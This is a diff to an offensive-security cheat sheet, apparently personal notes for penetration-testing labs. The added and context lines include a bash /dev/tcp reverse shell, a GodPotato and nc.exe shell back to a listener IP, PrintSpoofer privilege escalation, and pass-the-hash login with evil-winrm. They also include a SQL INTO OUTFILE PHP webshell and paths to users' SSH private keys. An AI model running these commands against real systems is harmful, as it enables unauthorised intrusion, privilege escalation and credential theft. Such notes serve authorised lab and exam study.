@@ -396,16 +396,13 @@ find / -perm -g=s -type f 2>/dev/null | grep -v "/snap"
 
 #### Windows
 
-``` sh
-# Run cmd as other user (need password)
-runas /user:USER cmd
-```
-
 ##### Enumeration
 
 ``` ps1
 # Username and hostname
 whoami
+# Privileges
+whoami /priv
 # Groups user is member of
 whoami /groups
 # Other users
@@ -420,6 +417,10 @@ Get-LocalGroupMember GROUPNAME
 
 # System info
 systeminfo
+# Always look in any specific service folders related to the challenge
+../*config*
+../*users*
+etc
 # Network info
 ipconfig /all
 route print
@@ -454,6 +455,13 @@ cp /usr/share/peass/winpeas/winPEASx64.exe .
 python3 -m http.server 80
 iwr -uri http://IP/winPEASx64.exe -Outfile winPEAS.exe
 .\winPEAS.exe
+```
+
+##### Execute as other user
+
+``` sh
+# Run cmd as other user (need password)
+runas /user:USER cmd
 ```
 
 ##### Windows Services
@@ -590,6 +598,10 @@ certutil -urlcache -split -f http://192.168.45.235/GodPotato-NET4.exe
 # Get netcat for reverse shell
 certutil -urlcache -split -f http://192.168.45.235/nc.exe
 .\GodPotato-NET4.exe -cmd "nc.exe 192.168.45.235 4444 -e cmd"
+
+# PrintSpoofer (alternative)
+iwr -uri http://IP/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
+PrintSpoofer64.exe -i -c "cmd /c cmd.exe"
 ```
 
 ##### Code Samples
@@ -1104,11 +1116,35 @@ netexec ldap IP -u 'USER' -p 'PASSWORD' -M laps
 netexec ldap IP -u Administrator -p 'PASSWORD'
 ```
 
+#### Squid Proxy (TCP: 3128)
+
+##### Services
+
+``` sh
+# Find open ports on proxy itself
+# Spose
+python spose.py --proxy http://IP:3128 --target IP -allports
+# Nmap (results not always consistent with other tools)
+nmap -Pn -sV -p 3128 --script http-open-proxy IP
+# When connecting to service, don't use localhost, use 127.0.0.1
+```
+
+##### Proxying
+
+``` sh
+# In browser, use FoxyProxy
+# In CLI, use Proxychains and/or curl
+curl --proxy http://IP:3128 http://IP:PORT
+proxychains TOOL_WITH_PARAMETERS
+```
+
 #### WinRM (TCP: 5985/5986)
 
 ```sh
 # Remote login
 evil-winrm -i IP -u 'USER' -p 'PASSWORD' 
+# Remote login with hash
+evil-winrm -i IP -u 'USER' -H 'NTHASH'
 ```
 
 #### Databases
@@ -1147,7 +1183,7 @@ show tables from DBNAME;
 
 ```sh
 # PostgreSQL login
-psql -h IP -p 2PORT5 -U USER
+psql -h IP -p PORT -U USER
 
 # List DBs
 \l
@@ -1158,7 +1194,7 @@ select * from DB_NAME;
 ```
 
 
-### Reverse Shells
+### Web and Reverse Shells
 
 [https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#summary](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#summary)
 [Linux and Windows PHP shell](https://github.com/ivan-sincek/php-reverse-shell/)
@@ -1172,6 +1208,9 @@ echo %COMSPEC%
 
 # Kali directory webshells
 /usr/share/webshells/
+
+# Create webshell using SQL (e.g. in phpmyadmin)
+SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\<FOLDERPATH>\\shell.php"
 
 # Bash
 bash -i >& /dev/tcp/IP/PORT 0>&1
@@ -1209,6 +1248,8 @@ nc -nvlp PORT
 
 # Meterpreter listener
 msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST IP;set LPORT PORT;run;"
+# Meterpreter listener (stageless)
+msfconsole -x "use exploit/multi/handler;set payload windows/shell_reverse_tcp;set LHOST IP;set LPORT PORT;run;"   
 
 # Powercat listener script (Kali) and command to execute
 cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
@@ -1270,13 +1311,16 @@ sudo -l
 
 
 
-# Directory traversal Windows
+# Directory traversal / local file inclusion Windows
+# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal
 C:\Windows\System32\drivers\etc\hosts
 # IIS web server files/folders
 C:\inetpub\logs\LogFiles\W3SVC1\
 C:\inetpub\wwwroot\web.config
 # XAMPP PHP
 C:\xampp\apache\logs
+# SSH
+C:\Users\USER\.ssh\id_rsa
 
 # Decode Base64
 echo <base64> | base64 -d
@@ -1328,7 +1372,9 @@ wpscan --url http://IP -v
 # Replace admin password in database
 mysql -u USER --password=PASS -h localhost -e "use wp;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
 
-
+# Impacket
+# Change password
+impacket-changepasswd USER@DOMAIN -newpass 'NEWPASSWORD'
 ```
 
 ### Kali Setup
